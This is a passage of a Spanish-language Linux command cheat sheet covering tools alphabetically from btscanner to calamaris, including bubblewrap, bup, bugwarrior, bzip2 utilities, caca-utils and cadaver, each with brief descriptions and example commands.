Luego, consulta el uso por subvolumen:
# btrfs qgroup show /mnt


btscanner
Escanear dispositivos bluetooth
$ btscanner


btsync
Compartir carpetas. Descargar el archivo que corresponda a nuestra arquitectura de http://labs.bittorrent.com/experiments/sync.html. No precisa instalación.
$ cd btsync_x64
Si no queremos modificar los datos, podemos acceder a la aplicación con la dirección del navegador: http://0.0.0.0:8888 con nombre de usuario: "admin" y contraseña: "password". Si queremos personalizar los datos, matar el proceso:
$ kill -9 PID
Y crear el archivo de configuración:
$ ./btsync --dump-sample-config > sync.conf
Editar y modificar los parámetros indicados según conveniencias:
$ nano sync.conf
	"storage_path" : "/home/USUARIO/.sync"
	"listen" : "127.0.0.1:8888",
    	"login" : "USUARIO",
    	"password" : "CONTRASEÑA"
Guardar y lanzar la aplicación:
$ ./btsync --config sync.conf
Acceder por el navegador con la dirección: http://127.0.0.1:8888
Colocar en el cron para que queda activo al reiniciar:
$ crontab -e
Colocar la linea:
	@reboot /home/USUARIO/btsync_x64/btsync --config /home/USUARIO/btsync_x64/sync.conf
Guardar. Para compartir una carpeta: clic en "Add Folder", seleccionar la carpeta, generar la clave pulsando en "generate" y finalizar clicando en "Add". En el pc que sincronizará la carpeta, abrir la misma dirección, clic en "add folder" y, sin clicar en "generate", introducir la clave generada antes y seleccionar la carpeta donde se copiará.


bubblewrap
Herramienta ligera para crear contenedores sin privilegios. Permite aislar procesos del sistema anfitrión configurando un espacio de nombres y puntos de montaje personalizados, ideal para tareas como empaquetado, pruebas o ejecución de software en entornos limitados.
# bwrap --dev /dev --proc /proc --bind / / sh (monta /dev y /proc dentro del contenedor, une el sistema anfitrión [/] al contenedor y inicia un shell aislado)
# bwrap --bind /path/to/directory / --dev /dev --proc /proc bash (ejecutar "bash" en /path/to/directory como la raíz del contenedor)
# bwrap --unshare-net --bind / / bash (crea un espacio de nombres de red independiente, aislando al proceso del sistema anfitrión)
# bwrap --tmpfs /tmp --bind / / bash (crea un directorio /tmp como un sistema de archivos temporal y usa el resto del sistema anfitrión como base)
# bwrap --ro-bind /bin /bin --ro-bind /lib /lib --ro-bind /usr /usr --dev /dev --proc /proc bash (monta /bin, /lib y /usr como solo lectura e incluye /dev y /proc para que los programas funcionen correctamente)
# bwrap --unshare-user --uid 1000 --gid 1000 --bind / / bash (ejecuta un shell con el UID y GID 1000 dentro del contenedor, independientemente del usuario anfitrión)
# bwrap --unshare-pid --bind / / bash (que los procesos dentro del contenedor no puedan ver ni interactuar con los del sistema anfitrión)
# bwrap --ro-bind /etc /etc --dev /dev --proc /proc bash (monta /etc como solo lectura dentro del contenedor)
# bwrap --bind / / --chdir /home/user bash (establece /home/user como el directorio de trabajo del contenedor)
# bwrap --unshare-ipc --bind / / bash (asegurar que las colas de mensajes y memoria compartida no sean visibles para procesos externos)
# bwrap --dev /dev --proc /proc --tmpfs /tmp bash (el contenedor no tiene acceso al sistema anfitrión más allá de /dev y /proc)
# bwrap --bind / / --dev /dev --proc /proc /usr/bin/ls (uso combinado con flatpak)
1.-
Probar un programa en un entorno restringido:
# bwrap \
  --bind /usr/bin /usr/bin \
  --bind /usr/lib /usr/lib \
  --bind /etc /etc \
  --ro-bind /var /var \
  --tmpfs /tmp \
  --dev /dev \
  --proc /proc \
  --unshare-net \
  /usr/bin/python3 --version
Permite acceso limitado a /usr/bin, /usr/lib y /etc, monta /var como solo lectura y crea un nuevo /tmp, aísla la red y ejecuta Python dentro del contenedor.
2.-
Crear un script para ejecutar aplicaciones con restricciones repetidamente. Por ejemplo:
# nano sandbox.sh
#!/bin/bash
bwrap --bind / / --tmpfs /tmp --ro-bind /usr /usr --unshare-net --chdir /tmp bash
# chmod +x sandbox.sh  (hacerlo ejecutable)
Y lanzarlo cada vez que se necesite un entorno aislado.


bucardo
Sistema de replicación asincrónico de PostgreSQL que permite operaciones con múltiples maestros y múltiples esclavos.
$ bucardo add database test1 dbname=test1 (conocer cada base de datos con la que se necesita comunicar)
$ bucardo add database test2 dbname=test2
$ bucardo add all tables db=test1 -T pgbench_history --relgroup=pgbench --verbose (agregar todas las tablas a test1 con el nombre "pgbench", excluyendo pgbench_history)
$ bucardo add sync benchdelta relgroup=pgbench dbs=test1,test2 (sincronizar pgbench)
$ bucardo list dbs (distintos listados posibles)
$ bucardo list dbgroups
$ bucardo list relgroups
$ bucardo list syncs
$ bucardo list tables
$ bucardo start (arrancar el servicio)
$ bucardo status (el estados)
$ bucardo stop (parar servicio)


bucklesprint
Emula el sonido de un antiguo teclado con resortes de IBM Model-M mientras se escribe en una sesión X. Se ejecuta como un proceso en segundo plano y reproduce el sonido de cada tecla presionada y soltada en el teclado, como si se estuviera utilizando un IBM Model-M.
$ buckle (empieza la emulación de todo lo que se escribe)


buffer
Herramienta diseñada para gestionar la velocidad de transferencia de datos mediante almacenamiento en búfer. Es especialmente útil en operaciones de copia de seguridad con cintas o en situaciones donde se desea optimizar la transmisión de datos entre procesos y convertir una tasa de datos de entrada variable a una tasa de datos de salida constante.
$ cat archivo_grande | buffer > archivo_salida (lee datos de la entrada estándar y los pasa a la salida estándar con almacenamiento en búfer)
$ cat archivo_grande | buffer -s 64k > archivo_salida (el tamaño del búfer se establece en 64 KB para optimizar la transmisión de datos)
$ dd if=/dev/zero bs=1M count=100 | buffer -b 512 > salida.bin (configura bloques de 512 bytes en lugar del tamaño predeterminado)
$ cat archivo_grande | buffer -p 1024 > archivo_salida (limita la transferencia a 1 MB/s - 1024 KB/s)
$ cat archivo_grande | buffer -t > archivo_salida (muestra estadísticas en tiempo real sobre la cantidad de datos transferidos)
$ tar cf - /directorio | buffer -s 128k -p 4096 > /dev/st0 (con cintas de copia de seguridad, como /dev/st0. Crear una copia del directorio con tamaño de bufer de 128 y limite a 4MB/s)
$ dd if=/dev/sda bs=1M | buffer -s 256k -p 8192 > /dev/st0 (copia del disco /dev/sda a la cinta /dev/st0)
$ tar cf - /directorio | gzip | buffer > copia.tar.gz (los datos son comprimidos y almacenados en un archivo utilizando buffer para optimizar la transferencia)
$ nc -l 12345 | buffer -s 1M > archivo_recibido (escuchar en el puerto 12345 y tamaño de búfer de 1 MB para optimiza la recepción)
$ cat archivo_grande | buffer | gzip > archivo_comprimido.gz (asegura un flujo constante entre cat y gzip, reduciendo interrupciones)
$ dd if=archivo.iso bs=1M | buffer -s 128k -p 2048 > /dev/sdb (optimiza la escritura al disco /dev/sdb utilizando un búfer de 128 KB y una velocidad límite de 2 MB/s)
$ tar cf - /directorio | buffer -s 256k -p 4096 | gzip > /dev/st0 (empaqueta el directorio, optimiza el flujo hacia la cinta y comprime los datos antes de almacenarlos)
$ yes "Prueba de datos" | buffer -s 16k -p 1024 > /dev/null (probar la transferencia de datos en un entorno controlado)


bugwarrior
Utilidad para actualizar la base de datos local de TaskWarrior desde los rastreadores de problemas de forjas de software como GitHub, GitLab, Bitbucket, Bugzilla, Debian, Gmail, etc. Primero configurar el archivo, un ejemplo:
$ nano ~/.bugwarriorrc
       [general]
       taskwarrior_taskrc = ~/.taskrc
       taskwarrior_taskdata = ~/.task
       cache_path = ~/.cache/bugwarrior
       update_interval = 15
       [github]
       enabled = yes
       username = tu_usuario_github
       password = tu_token_github
       repositories = owner/repo1, owner/repo2
       priority_map = low:low, medium:medium, high:high
       task_attributes = description:issue.body, tags:issue.labels, due:issue.due_on
       [gitlab]
       enabled = yes
       url = https://gitlab.com
       username = tu_usuario_gitlab
       password = tu_token_personal
       projects = owner/repo1, owner/repo2
       filter = label:important, label:bug
$ bugwarrior --check (si la configuración está correcta, mostrará los servicios habilitados y las conexiones exitosas)
$ bugwarrior (descargará todas las tareas abiertas y las actualiza si hubo cambios)
$ bugwarrior --dry-run (mostrará en pantalla las tareas detectadas y los cambios que se aplicarían sin modificar la base de datos)
$ bugwarrior --config-section github (sincronizar un rastreador específico definido en la configuración)
$ bugwarrior --no-sync (descargar y almacenar en caché las tareas desde los rastreadores, pero sin añadirlas a Taskwarrior)
$ bugwarrior --verbose (obtener información detallada sobre qué está haciendo bugwarrior durante la sincronización)
Nota.- Filter = label... sincronizará solo tareas etiquetadas como important o bug y task_attributes el cuerpo del issue de GitHub se convierte en la descripción de la tarea.
1.-
Ejecutar automáticamente con cron añadiendo la linea a crontab -e:
*/15 * * * * /usr/bin/bugwarrior >> ~/.bugwarrior.log 2>&1
2.-
Ejecutar automáticamente con systemd. Crear un archivo de servicio
# nano ~/.config/systemd/user/bugwarrior.service
Con las lineas:
    [Unit]
    Description=Actualización de Taskwarrior desde Bugwarrior
    [Service]
    ExecStart=/usr/bin/bugwarrior
# nano ~/.config/systemd/user/bugwarrior.timer
    [Unit]
    Description=Ejecutar Bugwarrior cada 15 minutos
    [Timer]
    OnBootSec=5m
    OnUnitActiveSec=15m
    [Install]
    WantedBy=timers.target
Habilitar y activar el timer:
# systemctl --user enable bugwarrior.timer
# systemctl --user start bugwarrior.timer


bugz
Herramienta que facilita la contribución rápida a proyectos utilizando el rastreador de errores de Bugzilla.
$ bugz create --product=MiProyecto --component=MiComponente --version=1.0 --priority=P4 --severity=M2 --summary="Descripción del problema" (crea un nuevo bug en Bugzilla con los detalles especificados)
$ bugz update --id=12345 --status=RESOLVED --resolution=FIXED --comment="Se ha solucionado el problema" (actualiza el estado y la resolución de un bug específico)
$ bugz search --title="error en la conexión" (buscar bugs por título)
$ bugz show --id=67890 (buscar bugs por ID)
$ bugz assign --id=12345 --assignee=johndoe@example.com (asignar un bug a un desarrollador)
$ bugz status --id=67890 (verificar el estado de un bug)
$ bugz link --id=12345 --link-type=DEPENDS --target-id=67890 (agregar una dependencia entre bugs)
$ bugz unlink --id=12345 --link-type=DEPENDS --target-id=67890 (eliminar una dependencia)
$ bugz info --id=12345 (obtener información detallada de un bug)


bugzilla-cli
Herramienta para interactuar con el sistema Bugzilla, que es una plataforma para gestión de bugs y seguimiento de proyectos.
$ bugzilla-cli --url https://bugs.example.com login (pedirá tu nombre de usuario y contraseña para conectarte al servidor Bugzilla especificado)
$ bugzilla-cli --url https://bugs.example.com show-bug 1234 (mostrará los detalles del bug con el ID 1234)
$ bugzilla-cli --url https://bugs.example.com stats (mostrará resúmenes de estadísticas de bugs como número total, bugs abiertos, cerrados, etc)
1.-
Crear un nuevo bug de ejemplo:
$ bugzilla-cli --url https://bugs.example.com create-bug \
    --product "Mi Proyecto" \
    --component "Desarrollo Web" \
    --version "1.0" \
    --summary "Nuevo defecto encontrado en la página principal" \
    --description "El problema se produce cuando se intenta acceder a la página principal."
2.-
Actualizar un bug:
$ bugzilla-cli --url https://bugs.example.com update-bug \
    --bug-id 1234 \
    --comment "Se ha actualizado la descripción del problema"
3.-
Cerrar un defecto:
$ bugzilla-cli --url https://bugs.example.com close-bug \
    --bug-id 1234 \
    --resolution RESOLVED \
    --status CLOSED
4.-
Buscar defectos por título o descripción:
$ bugzilla-cli --url https://bugs.example.com search \
    --query "error en página principal" \
    --output-format json


build-essential
Contiene una lista de paquetes esenciales para el sistema y la compilación. En el navegador colocar file:///usr/share/build-essential/essential-packages-list


buildah
Herramienta que se utiliza para tratar con contenedores compatibles con la Open Container Initiative [OCI].
$ buildah from centos:8 (crea una nueva imagen de contenedor basada en la imagen especificada)
$ buildah bud -t <nombre-imagen> (construye una imagen personalizada desde el directorio actual)
$ buildah run mi-contenedor echo "Hola desde el contenedor" (ejecuta un comando dentro de la imagen de contenedor especificada)
$ buildah inspect mi-contenedor (muestra información detallada sobre la imagen de contenedor)
$ buildah rm mi-contenedor (eliminar la imagen de un contenedor)


builtin
Cuando introducimos un comando en Bash el orden de preferencia en la búsqueda del símbolo por parte de Bash es: Primero las funciones, luego los comandos internos y por último los ficheros de scripts y ejecutables. builtin es más restrictivo que command [ver] y hace que no se busquen alias ni funciones, sólo comando internos [ver tambien comando enable]:
$ builtin cd /


buku
Gestión de marcadores. Importación automática de firefox, chrome y chromium, exporta/importa de html, markdown y org, los abre en el navegador...
$ buku -u (actualizar campos de los marcadores, comentarios, tags, título...)
$ buku -ui (importa los marcadores de los navegadores)
$ buku -a http://lapipaplena.duckdns.org/tractatus/ (entrar una url)
$ buku -a https://www.deepl.com/es/translator -c traductor --title Deepl traductor (entrar un marcador con comentario y título)
$ buku -a https://www.facebook.com/ -c redes de mierda --title una de las redes -t redes (entrar marcador con comentario, título y tag)
$ buku -a https://www.facebook.com/ -c redes de mierda --title una de las redes -t redes --immutable 1 (que no se actualicen com el argumento -u)
$ buku -p -15 (ver los 15 primeros del listado)
$ buku -d (borrar todos los marcadores)
$ buku -d 7-12 () borrar los marcadores del 7 al 12)
$ buku -d 5 (suprimir el marcador num. 5)
$ buku -S debian (mostrar los marcadores con el tag "debian")
$ buku -e bookmarks.html (crear un .html con todos los marcadores)
$ buku -i bookmarks.html (importar un .html con los marcadores)
$ buku -e bookmarks.org (crear un archivo .org con todos los marcadores)
$ buku -S blank (listar los marcadores que no tienen ni título ni tag)
$ buku -w nano (indicar que el editor es nano)
$ buku -u 1 -c tractatus elementalis (actualizar el num. 1 y añadir un comentario)
$ buku -l (pedirá contraseña y confirmación para encriptar el archivo)
$ buku -k (desencriptar el archivo)
Nota.- Los nuevos comentarios, tags o título sustituyen a los que constan en la entrada.


bundlewrap
Sistema de gestión de configuración descentralizada. Mientras que la mayoría de los sistemas de gestión de configuración se basan en una arquitectura cliente-servidor, bundlewrap funciona a partir de un repositorio clonado en la máquina local.
$ bw apply -i mynode (aplicar la configuración al nodo preguntando interactivamente antes de hacer cada cambio)
$ bw run nodo1,grupo2,nodo3 "uname -a" (ejecutar comandos en los nodos y grupos especificados)
$ bw test (paquete de pruebas útil después de cada confirmación. Intentará detectar cualquier error en paquetes y plantillas de archivos inicializando cada elemento de cada nodo)


bunzip2
Descomprime ficheros bz2.
$ bunzip2 archivo.bz2


bup
Herramienta de respaldo que almacena las copias de seguridad en un sistema basado en el formato packfile de git. Esto permite que las copias de seguridad sean deduplicadas, incrementales y extremadamente eficientes en el uso del espacio.
$ bup init (antes de empezar, se debe inicializar un repositorio donde se almacenarán las copias de seguridad y que por defecto es en ~/.bup)
$ bup index ~/Documentos (indexar un directorio antes de respaldarlo)
$ bup save -n mis_docs ~/Documentos (crea un respaldo del directorio en el repositorio)
$ bup ls (listar los respaldos realizados y sus nombres)
$ bup restore -C ~/Restaurados mis_docs (restaurar un respaldo completo)
$ bup restore -C ~/Restaurados mis_docs/archivo.txt (restaurar un archivo específico dentro del respaldo)
$ bup save --gzip -n respaldo_comprimido ~/Documentos (comprimir respaldos)
$ bup save --lzo -n respaldo_rapido ~/Documentos (comprimir respaldos con lzo)
$ bup ftp (inicia un servidor FTP local que permite navegar por los respaldos usando un cliente FTP o incluso con un navegador web)
$ bup save -n respaldo_incremental ~/directorio (deduplicará y almacenará únicamente los cambios)
$ bup fsck (revisa el sistema de respaldo y reporta errores si los hay)
$ bup diff respaldo1 respaldo2 (comparar respaldos)
$ bup rm respaldo_nombre (eliminar respaldos antiguos)
$ bup save -n respaldo_correo ~/Maildir (crea respaldos incrementales y deduplicados de los correos electrónicos)
1.-
Respaldar sobre SSH. Para realizar respaldos en un servidor remoto vía SSH:
$ ssh usuario@servidor "bup init" (configurar bup en el servidor remoto)
$ bup save -n respaldo_remoto -r usuario@servidor:/ruta/al/repositorio /ruta/del/directorio (realizar el respaldo)
2.-
Automatizar respaldos con cron
$ crontab -e
Añadir la línea:
     0 2 * * * bup index /ruta/del/directorio && bup save -n respaldo_diario /ruta/del/directorio
Esto realiza el respaldo a las 2:00 AM todos los días.
3.-
Realizar copias de seguridad de sistemas enteros excluyendo directorios como /proc, /sys, /dev.
# bup index /
# bup save -n respaldo_sistema /
4.-
Exportar un respaldo como un archivo tar para compartir o mover un respaldo:
$ bup fuse /punto/de/montaje
$ tar -cf respaldo.tar -C /punto/de/montaje respaldo_nombre
$ fusermount -u /punto/de/montaje


burnp6
[cpuburn]. Colocar la cpu al 100%. Si existen varios nucleos lanzar una instancia para cada uno. Existen varias opciones según el tipo de nucleo: burnBX, burnK6, burnK7, burnMMX, burnP5 y burnP6.
$ burnP6


burp
Sistema de copia de seguridad cliente-servidor que utiliza librsync para ahorrar espacio y uso de red.
$ burp --config "use_librsync=yes" (configurar el uso de librsync)
$ burp --create /ruta/original /ruta/copia (crear copia de seguridad)
$ burp --restore /ruta/copia /ruta/original (restaurar desde una copia de seguridad)
$ burp --verify /ruta/copia (verificar la integridad de una copia de seguridad)
$ burp --delete /ruta/copia (eliminar una copia de seguridad)
$ burp --list (listar todas las copias de seguridad)
$ burp --config "max_block_size=1048576" (configurar el tamaño máximo de bloque
$ burp --config "max_blocks=1000000" (configurar el número máximo de bloques)
$ burp --config "backup_dir=~/backups" (configurar el directorio de copias de seguridad)


burpsuite
Plataforma integral para pruebas de seguridad de aplicaciones web inncluidas pruebas de seguridad, evaluación de vulnerabilidades y pruebas de penetración. Es una herramienta comercial, pero también está disponible una versión gratuita con funciones limitadas.
# burpsuite (arrancar la aplicación)
# burpsuite --use-defaults (arrancar la aplicación usando la configuración predeterminada)
# burpsuite --project-file=~/proyecto/archivo (abrir el proyecto)
# burpsuite --config-file=~/config (cargar un archivo de configuración especifico)
# burpsuite --disable-extensions (arrancar sin extensiones)


busctl
Monitorear de D-bus
# busctl --activatable
# busctl --acquired
# busctl --unique
# busctl --show-machine
# busctl --quiet


bustle-pcap
Herramienta para trazar y proporcionar información de llamadas D-Bus.
# bustle-pcap -v monitor.pcap (con la máxima información de la sesión y guardado en el archivo monitor.pcap)


bustools
Herramienta especializada en la manipulación de datos generados por tecnologías de secuenciación de ARN de alto rendimiento, particularmente en análisis de datos de código de barras celulares [cell barcodes] y etiquetas moleculares únicas [UMIs]. Es muy útil para trabajar con datos procesados mediante kallisto en experimentos de transcriptómica de células individuales.
$ bustools correct -w whitelist.txt -o corrected.bus input.bus (-w: Lista blanca de códigos de barras válidos, -o: Salida con los códigos de barras corregidos y input.bus: Archivo de entrada generado por kallisto)
$ bustools sort -T tmp/ -o ordenado.bus input.bus (generar un índice para input bus. -T: Directorio temporal para operaciones intermedias)
$ bustools filter -o filtered.bus -e 0 input.bus (limpiar datos. -e los elimina -o archivo con los datos depurados)
$ bustools count -o counts.mtx -g transcripts_to_genes.txt -e matrix.ec -t transcripts.txt sorted.bus (-o: salida en formato Matrix Market, -g: Mapeo de transcripciones a genes, -e: Archivo de equivalencia generado por kallisto y -t: Lista de transcripciones.)
$ bustools merge -o merged.bus file1.bus file2.bus (fusionar varios archivos bus en merged.bus)
$ bustools text -o output.txt input.bus (convierte los datos procesados en una matriz de expresión génica, un formato utilizado para análisis de transcriptómica)
$ bustools capture -o simulated.bus -c capture.txt -e matrix.ec -t transcripts.txt input.bus (crea un archivo simulated.bus con datos simulados para pruebas)
$ bustools capture -o errors.bus -c error_patterns.txt input.bus (identificar lecturas con errores en UMIs o códigos de barras)
$ bustools sort -T tmp/ -o sorted.bus input.bus (indexar y ordenar datos)
$ bustools correct -w whitelist.txt -o corrected.bus sorted.bus (corregir códigos de barras celulares)
$ bustools count -o counts.mtx -g transcripts_to_genes.txt -e matrix.ec -t transcripts.txt corrected.bus (calcular la matriz de expresión génica)


busybox
Herramienta que integra los comandos linux más comunes. Útil en móviles con sistema Android.
$ busybox (Mostrará la forma de uso y los comando disponibles. En Android entra en el prompt. “exit” para salir)
$ busybox ls -a (lanzará ls -a desde el entorno busybox)
$ busybox su


busybox-syslogd
Demonio de registro del sistema responsable de proporcionar el registro de los mensajes recibidos de los programas y las funciones del host local, así como de los hosts remotos.
$ busybox-syslogd (iniciar el servicio y recopilará los registros del sistema y los almacenará en /var/log/messages)
$ busybox-syslogd -O /var/log/busybox/syslog.log (si queremos los registros en otro lugar)
$ busybox-syslogd -R servidor.remoto:514 (reenviar los registros del sistema a un servidor remoto y por el puerto 514)
$ busybox-syslogd -C (registrar los mensajes directamente en la consola para depuración en tiempo real)
$ busybox-syslogd -l 3 (limita los registros a mensajes con prioridad 3 o menor: errores, advertencias, etc)
$ busybox-syslogd -S 1048576 (que los registros se sobrescriban cuando se alcance un límite de tamaño, 1 MB en este caso)
$ busybox-syslogd -D (ejecutar el demonio en segundo plano como un servicio)
$ busybox-syslogd -O /var/log/syslog.log -R 192.168.1.100:514 -C (los registros localmente en /var/log/syslog.log, reenviarlos a un servidor remoto en 192.168.1.100:514 y registrar mensajes en la consola para monitoreo)
$ tail -f /var/log/syslog.log (verificar el estado de los registros)


buthead
[but not head - excepto el encabezado]. Programa para copiar líneas excepto las N primeras o últimas.
$ buthead 5 < archivo.txt (muestra en pantalla archivo.txt sin las primeras 5 lineas)
$ buthead 5 < archivo.txt > nuevo_archivo.txt (lo manda a un archivo)
$ cat archivo.txt | buthead 10 | grep "palabra" (elimina las primeras 10 líneas de archivo.txt y en el resto busca "palabra")
$ buthead -5 < archivo.txt > ultimo_5_líneas.txt (eliminar todas las líneas excepto las últimas 5)


bvi
Editor orientado a la visualización de archivos binarios basado en el editor de texto vi.


bwm-ng
Muestra uso del ancho de banda de nuestra conexión o de nuestros discos duros [por defecto en KB por cada medio segundo]
# bwm-ng (Por defecto nos muestra el ancho de banda de las conexiones de red)
# bwm-ng -i disk (Con la opción -i disk especificamos que queremos ver las estadísticas para los discos duros)
# bwm-ng -i disk -d (si añadimos la opción -d se hace más legible mostrando datos en Bytes, KB o MB)
Nota.- Si durante la ejecución pulsamos la tecla “h” accederemos a un menú de opciones.


byobu
Terminal tipo screen [ver] o tmux [ver] con una barra inferior que muestra consumos de cpu, ram, hora, fecha...
Algunas teclas de control:
	F2 (crear nueva pestaña)
	F3 (Ir a la pestaña anterior)
	F4 (Ir a la pestaña posterior)
	F5 (Refrescar estado)
	F6 (Salir dejando la terminal activa)
	F7 (Mostrar historial)
	F8 (Renombrar la pestaña)
	F9 (Configurar byobu)
	exit (Salir)


bytes-circle
Visualizar estadísticas sobre los bytes contenidos en un archivo de forma gráfica circular usando caracteres ASCII.
$ bytes-circle -o 0 script.sh (con color por defecto)
$ bytes-circle -n -o 0 archivo.txt (usando números)


byzanz
Grabar el escritorio o parte de él con salida en GIF animado, Theora, Ogg o Flash.
$ byzanz-record -c -d 20 archivo.ogg (Incluyendo puntero [-c] y durante 20 segundos. por defecto 10 segundos)
algunas opciones:
	-a (tambien grabar sonido)
	--delay=5 (Empezar pasados 5 segundos. Por defecto 1)
	-w 500 (grabar rectángulo de 500 pixels de ancho)
	-h 400 (grabar rectángulo de 400 pixels de alto)
	-x 30 (coordenadas x para el rectángulo)
	-y 60 (coordenadas y para el rectángulo)


bzcat
Descomprime hacia la salida estandar un archivo comprimido con bzip2.
$ bzcat archivo.bz2


bzcmp
Compara archivos comprimidos com bzip2 (Ver cmp)


bzdiff
Busca las diferencias entre dos ficheros comprimidos con bzip2 (Ver diff)


bzexe
[bzip2]. Comprimir/descomprimir ejecutables.
# bzexe ejecutable
# bzexe -d ejecutable (Descomprimir)


bzgrep
Imprime las lineas coincidentes con una expresión dada de un archivo comprimido con bzip2.
$ bzgrep pedro archivo.bz2 (Imprime las las que coinciden con “pedro”)


bzip2
comprime un fichero [ni empaqueta ni comprime directorios]
$ bzip2 fichero (Comprimir)
$ bzip2 -d fichero.bz2 (Descomprimir)
$ bzip2 -c fichero.bz2 (Ver contenido)
$ bzip2 -dc archivo.tar.bz2 | tar -xv (Descomprime y desempaqueta)
$ bzip2 -dc archivo.tar.bz2 | tar -t (Ver contenido)


bzip2recover
Intenta recuperar datos de ficheros bzip2 dañados.
$ bzip2recover archivo.bz2


bzless
[bzip2]. Muestra el contenido de un archivo .bz2 comprimido con bzip2 de forma parecida al comando less [ver]
$ bzless archivo.txt.bz2


bzmore
Visualiza de forma paginada el contenido de un archivo comprimido con bzip2
$ bzmore archivo.bz2


bzz
Codificar/descodificar ficheros.
$ bzz entrada salida
$ bzz -d entrada salida (Descodificar)


cabextract
Aplicación para abrir y extraer archivos .cab [de windows]
$ cabextract archivo.cab


caca-utils
Utilidades y programas de demostración para libcaca, la biblioteca de arte ASCII en color. Abre la mayoría de los formatos de imagen, como JPEG, PNG, GIF, etc., y los reproduce en la terminal utilizando arte ASCII. Incluye las herramientas cacaclock, cacademo, cacafire, cacaplay, cacaserver, cacaview y img2txt.


cacaclock
[caca-utils]. Muestra un reloj digital en ascii


cacademo
Demostración de arte ascii a color


cacafire
[caca-utils]. Fuego animado a color en ascii


cacaserver
[caca-utils]. Servidor telnet para librerias libcaca.
En el servidor:
$ CACA_DRIVER=raw cacafire | cacaserver
En el remoto:
$ telnet IP_o_Host 51914


cacaview
[caca-utils]. Visualizar imágenes en modo ascii y a color
$ cacaview imagen.jpg
Atajos:
        n,p (anterior siguiente imagen)
        +,- (zoom)
        z   (reset zoom, volver a la medida normal)
        q   (salir)


cache
(Memoria cache o memoria RAM). Cuando se ejecuta una aplicación, la misma es cargada primero en la memoria RAM. Parte de la información del aplicativo queda en memoria RAM Cache, para cuando se vuelva ha ejecutar, no sea necesario cargarlo todo nuevamente y el proceso sea múcho más rápido. Otra forma de utilizar memoria RAM Cache, es cuando tenemos mucha escritura en Disco, ya que el Kernel de Linux graba primero en la memoria caché, para luego, cada cierto tiempo, hacer un volcado en el disco. La limpieza y el manejo de la memoria RAM la hace el SO de forma automática, pero hay casos donde se hace necesario efectuar una limpieza manual.
# free -m (comprobación del uso de la memoria)
# sync; echo 3 >'/proc/sys/vm/drop_caches' && swapoff -a && swapon -a
# free -m (volver a lanzar para comprobar los cambios)
Los posibles valores asignados a drop_caches son:
    0 - Cede el control al Kernel para que administre la memoria
    1 - Se obliga al sistema a vaciar las páginas del cache (pagecache).
    2 - Se obliga al sistema a vaciar las entradas de directorios (dentries) y nodos índice (inodos).
    3 - Se obliga al sistema a vaciar pagecache, dentries y inodos.
El comando sync sirve para forzar la grabación de información pendiente en la memoria caché. Los dentries representan la relación de forma estructurada que existe entre directorios-archivos. Los inode con los nodos índice de archivos y directorios que usa el Sistema de Archivos para administrar las actividades posibles de dichos archivos y directorios guardados en disco o memoria. Contiene la metadata de los archivos y directorios: permisos, tamaño, propietario, última fecha de acceso, creación, modificación, entre otros.


cacti
[php5 php5-gd php5-mysql mysql-server rrdtool snmp libjpeg62 libjpeg62-dev libpng12-0 libpng12-dev libgd2-xpm-dev]. Monitorizar y visualizar gráficas, estadísticas de dispositivos conectados a la red, ancho de banda consumido, detectar congestiones o picos de tráfico, monitorizar determinados puertos...  Cacti permite monitorizar cualquier equipo de red que soporte el protocolo SNMP, ya sea un switch, un router o un servidor Linux. Se accede al resto de la instalación con: http://192.168.1.5/cacti. Los datos por defecto: usuario: admin password: admin


cadaver
Cliente para WebDAV (Protocolo de Autoría y Versionado Distribuido basado en HTTP) que permite gestionar archivos en servidores. Su funcionamiento es similar al de un cliente FTP o SMB, con comandos para navegar, cargar, descargar y manipular archivos en servidores remotos.
$ cadaver https://servidor (si requiere autenticación, pedirá nombre de usuario y contraseña)
Una vez conectado, se puede usar comandos similares a los de FTP: ls, cd, put, get, mkdir, delete, mget, mput, quit
1.-
Supongamos que se necesita subir y descargar archivos desde un servidor WebDAV alojado en https://webdav.example.com. Los pasos serían:
$ cadaver https://webdav.example.com
Introducir tu usuario y contraseña si se solicita.
> cd documentos (ir al directorio remoto)
> put informe.pdf (subir un archivo local al servidor)
> get reporte.docx (descargar un archivo del servidor al sistema local)
> edit archivo (Editar un archivo)
> move viejo nuevo (Cambiar el nombre de viejo a nuevo)
> delete archivo-viejo.txt (borrar un archivo del servidor)
> ? (Muestra todos los comandos disponibles)
> quit (cierra la sesión)


caddy
Servidor web escrito en Go con HTTPS automático de forma predeterminada y ZeroSSL y Let's Encrypt para nombres públicos.
$ caddy (iniciará un servidor web en modo estándar, sirviendo archivos desde el directorio actual)
$ caddy run --config Caddyfile (si se tiene un archivo de configuración)
$ caddy status (verificar estado)
$ pkill caddy (detener caddy)
$ caddy reload (reiniciar caddy)


cado
Permite al administrador del sistema delegar capacidades a los usuarios. Cado es un sudo basado en capacidades. Sudo permite a los usuarios autorizados ejecutar programas como root o como otro usuario, cado permite a los usuarios autorizados ejecutar programas con capacidades específicas. Es más selectivo que sudo, los usuarios pueden ser autorizados a tener solo capacidades específicas y no otras. El archivo /etc/cado.conf es donde se configuran las capacidades de los usuarios.
Permitir al usuario user1 y a todos los miembros del grupo usernet ejecutar programas que necesitan la capacidad net_admin. El usuario user1 también puede ejecutar programas que requieren cap_kill:
    net_admin: @usernet,user1
    cap_kill: user1
    setgid,setuid: user2,@group1


cadubi
Crear dibujos en la consola.
teclas:
	i j k l (Las que gobiernan el cursor: arriba [i], izquierda [j], derecha [l] y abajo [k])
	spacio (la brocha)
	del o ` (borrar caracter)
	p (Cambiar la letra de la brocha)
	f (Modificar el color de la letra)
	b (Modificar el color de fondo de la letra)
	g (Letra en negrita)
	v (Permutar los colores del fondo y la letra)
	t (Pasar a modo texto. "Esc" para salir de modo texto)
	Crtl+r (Abrir un archivo o un dibujo anterior)
	Ctrl+o (Guardar el archivo)
	Ctrl+h (Desplegar/ocultar la ayuda)
	Ctrl+x (Salir del prigrama)
Teclas de color. Es indistinto pulsar el número o la letra entre parentesis:
	0 (n) (Texto standard)
	1 (w) (Blanco)
	2 (r) (Rojo)
	3 (g) (Verde)
	4 (y) (Amarillo)
	5 (b) (Azul)
	6 (m) (Magenta)
	7 (c) (Cian)
	8 (k) (Negro)


cal
Muestra el calendario del mes
$ cal -y    (muestra todos los meses del año)
$ cal -m 1995 (muestra año indicado comenzando las semanas por lunes [-m])
$ cal 2011 (Muestra el año completo)
$ cal 05 2011 (Muestra el mes del año especificado)
$ cal -3  (Muestra el mes actual el anterior y el posterior)
$ cal -m |grep -A7 -B7 --color=auto $(date +%d) (Muestra el mes actual y coloreado el día actual)


calamaris
